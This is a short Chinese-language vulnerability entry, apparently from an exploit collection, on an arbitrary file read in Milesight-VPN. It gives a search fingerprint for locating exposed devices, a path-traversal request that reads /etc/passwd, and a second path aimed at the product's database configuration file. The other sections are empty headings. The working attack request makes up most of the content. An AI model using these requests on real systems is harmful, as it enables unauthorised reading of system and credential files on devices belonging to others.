# Milesight-VPN任意文件读取漏洞

- **系统**：Milesight　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="Milesight-VPN"`
- **请求**：`GET  /../etc/passwd HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

数据库配置
/../milesight_vpn/server/connect.js
```

**其他**
- Milesight-VPN任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * Milesight-VPN